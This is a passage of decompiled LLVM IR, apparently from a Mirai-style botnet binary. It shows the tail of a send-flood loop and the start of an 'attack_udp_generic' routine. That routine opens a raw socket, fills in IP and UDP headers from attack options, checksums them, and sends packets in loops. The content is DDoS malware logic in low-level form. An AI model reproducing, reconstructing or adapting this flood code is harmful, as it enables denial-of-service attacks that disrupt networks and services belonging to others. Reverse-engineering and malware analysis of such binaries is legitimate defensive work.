  %v1_cbe4 = add i32 %v0_cbe4, 4
  store i32 %v1_cbe4, i32* @r6, align 4
  br i1 %v9_cbe0, label %dec_label_pc_cbec, label %dec_label_pc_cb3c

dec_label_pc_cbec:                                ; preds = %dec_label_pc_cb8c, %dec_label_pc_cb20, %dec_label_pc_cab4
  %v1_cbf021 = phi i32 [ 0, %dec_label_pc_cab4 ], [ %v0_cbe0, %dec_label_pc_cb8c ], [ %v0_cb30, %dec_label_pc_cb20 ]
  store i32 0, i32* @r5, align 4
  %v2_cc24 = icmp eq i32 %v1_ca70, 0
  br label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cbf0.backedge, %dec_label_pc_cbec
  %v1_cbf0 = phi i32 [ %v1_cbf0.pre, %dec_label_pc_cbf0.backedge ], [ %v1_cbf021, %dec_label_pc_cbec ]
  %v1_cc28 = phi i32 [ %v0_cbf019, %dec_label_pc_cbf0.backedge ], [ 0, %dec_label_pc_cbec ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v5_cbf8 = icmp slt i32 %v1_cc28, %v1_cbf0
  br i1 %v5_cbf8, label %dec_label_pc_cc1c, label %dec_label_pc_cbfc

dec_label_pc_cbfc:                                ; preds = %dec_label_pc_cbf0
  %v2_cbfc = call i32 @__GI_time(i32* null)
  store i32 %v2_cbfc, i32* %r0.global-to-local, align 4
  store i32 %v0_caa810, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v6_cc0c = icmp slt i32 %v0_caa810, %v2_cbfc
  br i1 %v6_cc0c, label %dec_label_pc_cc10, label %dec_label_pc_cbf0.backedge

dec_label_pc_cc10.loopexit14:                     ; preds = %dec_label_pc_cacc
  %v1_cc18.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cbfc, %dec_label_pc_cc10.loopexit14
  %v1_cc18 = phi i32 [ %v1_cc18.pre, %dec_label_pc_cc10.loopexit14 ], [ %v2_cbfc, %dec_label_pc_cbfc ]
  ret i32 %v1_cc18

dec_label_pc_cc1c:                                ; preds = %dec_label_pc_cbf0
  store i32 %v2_c9e0, i32* %r3.global-to-local, align 4
  %v4_cc28 = mul i32 %v1_cc28, 4
  %v5_cc28 = add i32 %v4_cc28, %v2_c9e0
  %v6_cc28 = inttoptr i32 %v5_cc28 to i32*
  %v7_cc28 = load i32, i32* %v6_cc28, align 4
  store i32 %v7_cc28, i32* @r4, align 4
  br i1 %v2_cc24, label %dec_label_pc_cc30, label %dec_label_pc_cc4c

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cc1c, %dec_label_pc_cc4c
  %v0_cc34 = phi i32 [ %v7_cc28, %dec_label_pc_cc1c ], [ %v0_cc34.pre, %dec_label_pc_cc4c ]
  %v1_cc30 = phi i32 [ %v1_cc28, %dec_label_pc_cc1c ], [ %v1_cc30.pre, %dec_label_pc_cc4c ]
  %v0_cc30 = load i32, i32* @sb, align 4
  %v4_cc30 = mul i32 %v1_cc30, 4
  %v5_cc30 = add i32 %v4_cc30, %v0_cc30
  %v6_cc30 = inttoptr i32 %v5_cc30 to i32*
  %v7_cc30 = load i32, i32* %v6_cc30, align 4
  store i32 %v7_cc30, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_cc40 = call i32 @__libc_send(i32 %v7_cc30, i32 %v0_cc34, i32 %v3_ca54, i32 16384)
  store i32 %v4_cc40, i32* %r0.global-to-local, align 4
  %v0_cc44 = load i32, i32* @r5, align 4
  %v1_cc44 = add i32 %v0_cc44, 1
  store i32 %v1_cc44, i32* @r5, align 4
  br label %dec_label_pc_cbf0.backedge

dec_label_pc_cbf0.backedge:                       ; preds = %dec_label_pc_cc30, %dec_label_pc_cbfc
  %v0_cbf019 = phi i32 [ %v1_cc44, %dec_label_pc_cc30 ], [ 0, %dec_label_pc_cbfc ]
  %v1_cbf0.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_cbf0

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc1c
  store i32 %v7_cc28, i32* %r0.global-to-local, align 4
  %v2_cc54 = call i32 @rand_alphastr(i32 %v7_cc28, i32 %v3_ca54)
  store i32 %v2_cc54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cc60 = load i32, i32* @r4, align 4
  %v4_cc60 = add i32 %v3_cc60, %v3_ca54
  %v5_cc60 = inttoptr i32 %v4_cc60 to i8*
  store i8 0, i8* %v5_cc60, align 1
  %v1_cc30.pre = load i32, i32* @r5, align 4
  %v0_cc34.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc30

dec_label_pc_cc68:                                ; preds = %entry
  %v1_caa012 = load i32, i32* @r7, align 4
  %v2_caa013 = add i32 %v1_caa012, %v2_ca8c
  store i32 %v2_caa013, i32* %r0.global-to-local, align 4
  %v0_cc68 = call i32 @rand_next()
  %v3_cc70 = urem i32 %v0_cc68, 65536
  store i32 %v3_cc70, i32* %r0.global-to-local, align 4
  %extract.t59 = trunc i32 %v0_cc68 to i16
  br label %dec_label_pc_cab4

; uselistorder directives
  uselistorder i32 %v0_cc68, { 1, 0 }
  uselistorder i32 %v2_caa013, { 1, 0 }
  uselistorder i32 %v7_cc28, { 2, 1, 0, 3 }
  uselistorder i32 %v5_cbc8, { 1, 0 }
  uselistorder i32 %v0_cb78, { 1, 0 }
  uselistorder i32 %v0_cb50, { 2, 0, 1 }
  uselistorder i32 %v3_cad8, { 1, 0, 2 }
  uselistorder i32 %v0_caa810, { 1, 0 }
  uselistorder i32 %v4_ca9c, { 1, 0 }
  uselistorder i32 %v3_ca54, { 2, 1, 0 }
  uselistorder i32 %v2_c9e0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 11, 8, 9, 12, 14, 13, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 19, 8, 7, 11, 9, 10, 12, 13, 23, 21, 15, 14, 16, 18, 20, 17, 22, 25, 24, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cc30, { 1, 0 }
  uselistorder label %dec_label_pc_cc10, { 1, 0 }
  uselistorder label %dec_label_pc_cacc, { 1, 0 }
  uselistorder label %dec_label_pc_cab4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_cc7c = load i32, i32* @lr, align 4
  store i32 0, i32* @r8, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_cca8 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_ccac = load i32, i32* @r4, align 4
  store i32 %v0_ccac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ccb8 = load i32, i32* @r8, align 4
  store i32 %v0_ccb8, i32* %r3.global-to-local, align 4
  %v0_ccbc = load i32, i32* @r5, align 4
  store i32 %v0_ccbc, i32* %r0.global-to-local, align 4
  %v5_ccc0 = inttoptr i32 %v0_ccac to i32*
  %v6_ccc0 = call i32 @attack_get_opt_int(i32 %v0_ccbc, i32* %v5_ccc0, i32 2, i32 %v0_ccb8)
  %v1_cccc = urem i32 %v6_ccc0, 256
  store i32 %v1_cccc, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ccd8 = load i32, i32* @r4, align 4
  store i32 %v0_ccd8, i32* %r1.global-to-local, align 4
  %v0_ccdc = load i32, i32* @r5, align 4
  store i32 %v0_ccdc, i32* %r0.global-to-local, align 4
  %v5_cce0 = trunc i32 %v6_ccc0 to i8
  %v6_cce4 = inttoptr i32 %v0_ccd8 to i32*
  %v7_cce4 = call i32 @attack_get_opt_int(i32 %v0_ccdc, i32* %v6_cce4, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_cce8 = load i32, i32* @r4, align 4
  store i32 %v0_cce8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_ccf8 = load i32, i32* @r5, align 4
  store i32 %v0_ccf8, i32* %r0.global-to-local, align 4
  %v5_ccfc = inttoptr i32 %v0_cce8 to i32*
  %v6_ccfc = call i32 @attack_get_opt_int(i32 %v0_ccf8, i32* %v5_ccfc, i32 4, i32 64)
  %v1_cd04 = urem i32 %v6_ccfc, 256
  store i32 %v1_cd04, i32* %ip.global-to-local, align 4
  %v0_cd08 = load i32, i32* @r4, align 4
  store i32 %v0_cd08, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_cd10 = load i32, i32* @r8, align 4
  store i32 %v0_cd10, i32* %r3.global-to-local, align 4
  %v0_cd14 = load i32, i32* @r5, align 4
  store i32 %v0_cd14, i32* %r0.global-to-local, align 4
  %v5_cd18 = trunc i32 %v6_ccfc to i8
  %v6_cd1c = inttoptr i32 %v0_cd08 to i32*
  %v7_cd1c = call i32 @attack_get_opt_int(i32 %v0_cd14, i32* %v6_cd1c, i32 5, i32 %v0_cd10)
  %v1_cd28 = urem i32 %v7_cd1c, 256
  store i32 %v1_cd28, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cd34 = load i32, i32* @r4, align 4
  store i32 %v0_cd34, i32* %r1.global-to-local, align 4
  %v0_cd38 = load i32, i32* @r5, align 4
  store i32 %v0_cd38, i32* %r0.global-to-local, align 4
  %v5_cd40 = inttoptr i32 %v0_cd34 to i32*
  %v6_cd40 = call i32 @attack_get_opt_int(i32 %v0_cd38, i32* %v5_cd40, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_cd4c = load i32, i32* @r4, align 4
  store i32 %v0_cd4c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_cd58 = load i32, i32* @r5, align 4
  store i32 %v0_cd58, i32* %r0.global-to-local, align 4
  %v5_cd5c = inttoptr i32 %v0_cd4c to i32*
  %v6_cd5c = call i32 @attack_get_opt_int(i32 %v0_cd58, i32* %v5_cd5c, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_cd60 = load i32, i32* @r4, align 4
  store i32 %v0_cd60, i32* %r1.global-to-local, align 4
  %v0_cd68 = load i32, i32* @r8, align 4
  store i32 %v0_cd68, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_cd70 = load i32, i32* @r5, align 4
  store i32 %v0_cd70, i32* %r0.global-to-local, align 4
  %v5_cd74 = inttoptr i32 %v0_cd60 to i32*
  %v6_cd74 = call i32 @attack_get_opt_int(i32 %v0_cd70, i32* %v5_cd74, i32 %v0_cd68, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cd80 = load i32, i32* @r4, align 4
  store i32 %v0_cd80, i32* %r1.global-to-local, align 4
  store i32 %v6_cd74, i32* @sl, align 4
  %v0_cd88 = load i32, i32* @r5, align 4
  store i32 %v0_cd88, i32* %r0.global-to-local, align 4
  %v4_cd8c = inttoptr i32 %v0_cd80 to i32*
  %v5_cd8c = call i32 @attack_get_opt_int(i32 %v0_cd88, i32* %v4_cd8c, i32 1, i32 1)
  %v2_cd98 = load i32, i32* @global_var_2610c.91, align 4
  store i32 %v2_cd98, i32* %r3.global-to-local, align 4
  %v1_cd9c = urem i32 %v5_cd8c, 256
  store i32 %v1_cd9c, i32* %ip.global-to-local, align 4
  %v0_cda0 = load i32, i32* @r4, align 4
  store i32 %v0_cda0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_cda8 = load i32, i32* @r5, align 4
  store i32 %v0_cda8, i32* %r0.global-to-local, align 4
  %v5_cdb0 = inttoptr i32 %v0_cda0 to i32*
  %v6_cdb0 = call i32 @attack_get_opt_int(i32 %v0_cda8, i32* %v5_cdb0, i32 24, i32 %v2_cd98)
  store i32 %v6_cdb0, i32* @sb, align 4
  %v0_cdb8 = load i32, i32* @r8, align 4
  store i32 %v0_cdb8, i32* %r0.global-to-local, align 4
  %v1_cdbc = inttoptr i32 %v0_cdb8 to i32*
  %v2_cdbc = call i32 @__GI_time(i32* %v1_cdbc)
  %v1_cdc0 = load i32, i32* @r6, align 4
  %v2_cdc0 = add i32 %v1_cdc0, %v2_cdbc
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_cdd4 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_cdd4, i32* %r0.global-to-local, align 4
  %v7_cdd8 = icmp eq i32 %v3_cdd4, -1
  store i32 %v3_cdd4, i32* @fp, align 4
  br i1 %v7_cdd8, label %dec_label_pc_d22c, label %dec_label_pc_cde4

dec_label_pc_cde4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_cdec = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_cdec, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_cdf4 = load i32, i32* @r8, align 4
  store i32 %v0_cdf4, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ce00 = call i32 @__GI_setsockopt(i32 %v3_cdd4, i32 %v0_cdf4, i32 3, i32 %v6_cdec, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ce00, i32* %r0.global-to-local, align 4
  %v7_ce04 = icmp eq i32 %v5_ce00, -1
  br i1 %v7_ce04, label %dec_label_pc_d238, label %dec_label_pc_ce0c

dec_label_pc_ce0c:                                ; preds = %dec_label_pc_cde4
  %v0_ce0c = load i32, i32* @sl, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ce18 = urem i32 %v0_ce0c, 65536
  %v3_ce1c = icmp ugt i32 %v3_ce18, 1459
  br i1 %v3_ce1c, label %bb, label %bb40

bb:                                               ; preds = %dec_label_pc_ce0c
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_ce0c, %bb
  %storemerge = phi i32 [ 1460, %bb ], [ %v3_ce18, %dec_label_pc_ce0c ]
  %v0_ce28 = phi i32 [ 1460, %bb ], [ %v3_ce18, %dec_label_pc_ce0c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v6_cd40, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v3_ce3c = mul i32 %v6_cd5c, 65536
  store i32 %v3_ce3c, i32* %r2.global-to-local, align 4
  %v3_ce44 = urem i32 %v7_cce4, 65536
  %v3_ce48 = urem i32 %v6_cd40, 65536
  store i32 %v3_ce48, i32* %ip.global-to-local, align 4
  %v3_ce4c = urem i32 %v6_cd5c, 65536
  store i32 %v3_ce4c, i32* %r0.global-to-local, align 4
  %v2_ce50 = icmp eq i32 %arg2, 0
  %v0_ce58 = load i32, i32* @r8, align 4
  store i32 %v0_ce58, i32* %stack_var_-44, align 4
  br i1 %v2_ce50, label %.dec_label_pc_cf84.preheader_crit_edge, label %dec_label_pc_ce6c

.dec_label_pc_cf84.preheader_crit_edge:           ; preds = %bb40
  %.pre = add nuw nsw i32 %v0_ce28, 8
  %.pre10 = add nuw nsw i32 %v0_ce28, 28
  br label %dec_label_pc_cf84.preheader

dec_label_pc_ce6c:                                ; preds = %bb40
  %v1_ce74 = add nuw nsw i32 %v0_ce28, 28
  %v1_ce78 = add nuw nsw i32 %v0_ce28, 8
  %tmp41 = mul nuw nsw i32 %v3_ce48, 256
  %v3_ce88 = and i32 %tmp41, 65280
  %v3_ce90 = mul i32 %v1_ce74, 65536
  store i32 %v3_ce90, i32* @lr, align 4
  %tmp42 = udiv i32 %v6_cd40, 256
  %v4_ce98 = urem i32 %tmp42, 256
  %v5_ce98 = or i32 %v3_ce88, %v4_ce98
  store i32 %v5_ce98, i32* @sl, align 4
  store i32 %v3_ce3c, i32* %r1.global-to-local, align 4
  %tmp43 = mul i32 %v6_cd5c, 256
  %v3_ceb0 = and i32 %tmp43, 65280
  %v2_ceb4 = icmp eq i32 %v1_cd28, 0
  %tmp44 = mul nuw nsw i32 %v1_ce74, 256
  %v3_ceb8 = and i32 %tmp44, 65280
  store i32 %v3_ceb8, i32* %r3.global-to-local, align 4
  %tmp45 = mul i32 %v7_cce4, 256
  %v3_cebc = and i32 %tmp45, 65280
  store i32 %v3_cebc, i32* %r2.global-to-local, align 4
  %tmp46 = mul nuw nsw i32 %v1_ce78, 256
  %v3_cec0 = and i32 %tmp46, 65280
  store i32 %v3_cec0, i32* %ip.global-to-local, align 4
  %tmp47 = udiv i32 %v6_cd5c, 256
  %v4_cec4 = urem i32 %tmp47, 256
  %v5_cec4 = or i32 %v4_cec4, %v3_ceb0
  store i32 %v5_cec4, i32* %r0.global-to-local, align 4
  %tmp48 = udiv i32 %v7_cce4, 256
  %v4_cec8 = urem i32 %tmp48, 256
  %v5_cec8 = or i32 %v4_cec8, %v3_cebc
  store i32 %v5_cec8, i32* @r8, align 4
  %tmp49 = udiv i32 %v1_ce74, 256
  %v4_cecc = urem i32 %tmp49, 256
  %v5_cecc = or i32 %v4_cecc, %v3_ceb8
  store i32 %v5_cecc, i32* @r6, align 4
  %tmp50 = udiv i32 %v1_ce78, 256
  %v4_ced0 = urem i32 %tmp50, 256
  %v5_ced0 = or i32 %v4_ced0, %v3_cec0
  store i32 %v5_ced0, i32* @r5, align 4
  %v5_ced4 = trunc i32 %v5_cec4 to i16
  store i32 0, i32* @r4, align 4
  br i1 %v2_ceb4, label %dec_label_pc_cee0.preheader, label %dec_label_pc_d16c.preheader

dec_label_pc_d16c.preheader:                      ; preds = %dec_label_pc_ce6c
  %v4_d1bc = sext i8 %v5_cd18 to i32
  %v4_d1fc = sext i16 %v5_ced4 to i32
  br label %dec_label_pc_d16c

dec_label_pc_cee0.preheader:                      ; preds = %dec_label_pc_ce6c
  %v4_cf58 = sext i16 %v5_ced4 to i32
  br label %dec_label_pc_cee0

dec_label_pc_cee0:                                ; preds = %dec_label_pc_cee0.preheader, %dec_label_pc_cee0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ceec = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_ceec, i32* %r0.global-to-local, align 4
  store i32 %v2_cca8, i32* %r2.global-to-local, align 4
  %v2_cef8 = load i32, i32* @r4, align 4
  %v5_cef8 = mul i32 %v2_cef8, 4
  %v6_cef8 = add i32 %v5_cef8, %v2_cca8
  %v7_cef8 = inttoptr i32 %v6_cef8 to i32*
  store i32 %v2_ceec, i32* %v7_cef8, align 4
  %v3_cefc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cefc, i32* %r1.global-to-local, align 4
  %v0_cf00 = load i32, i32* %r2.global-to-local, align 4
  %v4_cf00 = mul i32 %v3_cefc, 4
  %v5_cf00 = add i32 %v0_cf00, %v4_cf00
  %v6_cf00 = inttoptr i32 %v5_cf00 to i32*
  %v7_cf00 = load i32, i32* %v6_cf00, align 4
  store i32 %v7_cf00, i32* %r3.global-to-local, align 4
  %v1_cf04 = inttoptr i32 %v7_cf00 to i8*
  %v2_cf04 = load i8, i8* %v1_cf04, align 1
  %tmp = urem i8 %v2_cf04, 16
  %v1_cf08 = zext i8 %tmp to i32
  %v1_cf0c = or i32 %v1_cf08, 64
  store i32 %v1_cf0c, i32* %r2.global-to-local, align 4
  %v1_cf10 = trunc i32 %v1_cf0c to i8
  store i8 %v1_cf10, i8* %v1_cf04, align 1
  %v0_cf14 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf14 = inttoptr i32 %v0_cf14 to i8*
  %v2_cf14 = load i8, i8* %v1_cf14, align 1
  %v1_cf18 = and i8 %v2_cf14, -16
  %v1_cf1c = or i8 %v1_cf18, 5
  store i32 17, i32* %ip.global-to-local, align 4
  store i8 %v1_cf1c, i8* %v1_cf14, align 1
  %v0_cf28 = load i32, i32* %ip.global-to-local, align 4
  %v1_cf28 = trunc i32 %v0_cf28 to i8
  %v2_cf28 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf28 = add i32 %v2_cf28, 9
  %v4_cf28 = inttoptr i32 %v3_cf28 to i8*
  store i8 %v1_cf28, i8* %v4_cf28, align 1
  %v2_cf30 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf30 = add i32 %v2_cf30, 1
  %v4_cf30 = inttoptr i32 %v3_cf30 to i8*
  store i8 %v5_cce0, i8* %v4_cf30, align 1
  %v0_cf38 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf38 = mul i32 %v0_cf38, 32
  store i32 %v3_cf38, i32* %r0.global-to-local, align 4
  %v2_cf3c = load i32, i32* %r3.global-to-local, align 4
  %v3_cf3c = add i32 %v2_cf3c, 8
  %v4_cf3c = inttoptr i32 %v3_cf3c to i8*
  store i8 %v5_cd18, i8* %v4_cf3c, align 1
  %v0_cf40 = load i32, i32* @sb, align 4
  %v1_cf40 = load i32, i32* %r3.global-to-local, align 4
  %v2_cf40 = add i32 %v1_cf40, 12
  %v3_cf40 = inttoptr i32 %v2_cf40 to i32*
  store i32 %v0_cf40, i32* %v3_cf40, align 4
  %v0_cf44 = load i32, i32* %r0.global-to-local, align 4
  %v1_cf44 = load i32, i32* %r1.global-to-local, align 4
  %tmp52 = mul i32 %v1_cf44, -8
  %v5_cf44 = add i32 %v0_cf44, %tmp52
  %v1_cf48 = load i32, i32* @r7, align 4
  %v2_cf48 = add i32 %v5_cf44, %v1_cf48
  store i32 %v2_cf48, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_cf50 = add i32 %v1_cf44, 1
  store i32 %v1_cf50, i32* @r4, align 4
  %v1_cf54 = add i32 %v2_cf48, 16
  %v2_cf54 = inttoptr i32 %v1_cf54 to i32*
  %v3_cf54 = load i32, i32* %v2_cf54, align 4
  store i32 %v3_cf54, i32* %r2.global-to-local, align 4
  store i32 %v4_cf58, i32* %r0.global-to-local, align 4
  %v0_cf5c = load i32, i32* %r3.global-to-local, align 4
  %v1_cf5c = add i32 %v0_cf5c, 20
  store i32 %v1_cf5c, i32* %r1.global-to-local, align 4
  %v0_cf64 = load i32, i32* @r6, align 4
  %v1_cf64 = trunc i32 %v0_cf64 to i16
  %v3_cf64 = add i32 %v0_cf5c, 2
  %v4_cf64 = inttoptr i32 %v3_cf64 to i16*
  store i16 %v1_cf64, i16* %v4_cf64, align 2
  %v0_cf68 = load i32, i32* @r8, align 4
  %v1_cf68 = trunc i32 %v0_cf68 to i16
  %v2_cf68 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf68 = add i32 %v2_cf68, 4
  %v4_cf68 = inttoptr i32 %v3_cf68 to i16*
  store i16 %v1_cf68, i16* %v4_cf68, align 2
  %v0_cf6c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf6c = load i32, i32* %r3.global-to-local, align 4
  %v2_cf6c = add i32 %v1_cf6c, 16
  %v3_cf6c = inttoptr i32 %v2_cf6c to i32*
  store i32 %v0_cf6c, i32* %v3_cf6c, align 4
  %v0_cf70 = load i32, i32* @sl, align 4
  %v1_cf70 = trunc i32 %v0_cf70 to i16
  %v2_cf70 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf70 = add i32 %v2_cf70, 20
  %v4_cf70 = inttoptr i32 %v3_cf70 to i16*
  store i16 %v1_cf70, i16* %v4_cf70, align 2
  %v0_cf74 = load i32, i32* @r5, align 4
  %v1_cf74 = trunc i32 %v0_cf74 to i16
  %v2_cf74 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf74 = add i32 %v2_cf74, 4
  %v4_cf74 = inttoptr i32 %v3_cf74 to i16*
  store i16 %v1_cf74, i16* %v4_cf74, align 2
  %v0_cf78 = load i32, i32* %r0.global-to-local, align 4
  %v1_cf78 = trunc i32 %v0_cf78 to i16
  %v2_cf78 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf78 = add i32 %v2_cf78, 2
  %v4_cf78 = inttoptr i32 %v3_cf78 to i16*
  store i16 %v1_cf78, i16* %v4_cf78, align 2
  %v0_cf7c = load i32, i32* @r4, align 4
  store i32 %v0_cf7c, i32* %stack_var_-44, align 4
  %v5_cf80 = icmp slt i32 %v1_cf50, %arg2
  br i1 %v5_cf80, label %dec_label_pc_cee0, label %dec_label_pc_cf84.preheader

dec_label_pc_cf84.preheader:                      ; preds = %dec_label_pc_d16c, %dec_label_pc_cee0, %.dec_label_pc_cf84.preheader_crit_edge
  %v1_cfa4.pre-phi = phi i32 [ %.pre10, %.dec_label_pc_cf84.preheader_crit_edge ], [ %v1_ce74, %dec_label_pc_cee0 ], [ %v1_ce74, %dec_label_pc_d16c ]
  %v1_cfa0.pre-phi = phi i32 [ %.pre, %.dec_label_pc_cf84.preheader_crit_edge ], [ %v1_ce78, %dec_label_pc_cee0 ], [ %v1_ce78, %dec_label_pc_d16c ]
  %v9_d104 = icmp eq i32 %v3_ce44, add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1)
  %v2_d140 = icmp eq i32 %v1_cd9c, 0
  br label %dec_label_pc_cf84

dec_label_pc_cf84:                                ; preds = %dec_label_pc_cf84.preheader, %dec_label_pc_d218
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ce50, label %dec_label_pc_d218, label %dec_label_pc_cf98

dec_label_pc_cf98:                                ; preds = %dec_label_pc_cf84
  store i32 %v0_ce28, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_cfa0.pre-phi, i32* @sl, align 4
  store i32 %v1_cfa4.pre-phi, i32* @r8, align 4
  br label %dec_label_pc_d074

dec_label_pc_cfac:                                ; preds = %dec_label_pc_d074
  %v0_cfac = load i32, i32* @sb, align 4
  %v7_cfac = icmp eq i32 %v0_cfac, -1
  br i1 %v7_cfac, label %dec_label_pc_d0f4, label %dec_label_pc_cfb4

dec_label_pc_cfb4:                                ; preds = %dec_label_pc_d098, %dec_label_pc_cfac
  store i32 %v3_ce44, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r4, align 4
  br i1 %v9_d104, label %dec_label_pc_d110, label %dec_label_pc_cfc8

dec_label_pc_cfc8:                                ; preds = %dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge, %dec_label_pc_cfb4
  %v1_cfcc = phi i32 [ %v1_cfcc.pre, %dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), %dec_label_pc_cfb4 ]
  store i32 %v3_ce48, i32* %r0.global-to-local, align 4
  %v9_cfcc = icmp eq i32 %v3_ce48, %v1_cfcc
  br i1 %v9_cfcc, label %dec_label_pc_d124, label %dec_label_pc_cfd4

dec_label_pc_cfd4:                                ; preds = %dec_label_pc_d110, %dec_label_pc_cfc8
  %v1_cfd8 = phi i32 [ %v1_d11c, %dec_label_pc_d110 ], [ %v1_cfcc, %dec_label_pc_cfc8 ]
  store i32 %v3_ce4c, i32* %r1.global-to-local, align 4
  %v9_cfd8 = icmp eq i32 %v3_ce4c, %v1_cfd8
  br i1 %v9_cfd8, label %dec_label_pc_d138, label %dec_label_pc_cfe0

dec_label_pc_cfe0:                                ; preds = %dec_label_pc_d124, %dec_label_pc_cfd4
  store i32 %v1_cd9c, i32* %r2.global-to-local, align 4
  br i1 %v2_d140, label %dec_label_pc_cfec, label %dec_label_pc_d14c

dec_label_pc_cfec:                                ; preds = %dec_label_pc_cfe0, %dec_label_pc_d138, %dec_label_pc_d14c
  %v2_cff0 = load i32, i32* @r5, align 4
  %v3_cff0 = add i32 %v2_cff0, 10
  %v4_cff0 = inttoptr i32 %v3_cff0 to i16*
  store i16 0, i16* %v4_cff0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_cff8 = load i32, i32* @r5, align 4
  store i32 %v0_cff8, i32* @r0, align 4
  %v2_cffc = call i32 @checksum_generic(i32 %v0_cff8, i32 20)
  %v3_cffc = trunc i32 %v2_cffc to i16
  store i32 %v2_cffc, i32* %r0.global-to-local, align 4
  %v3_d000 = load i32, i32* @r5, align 4
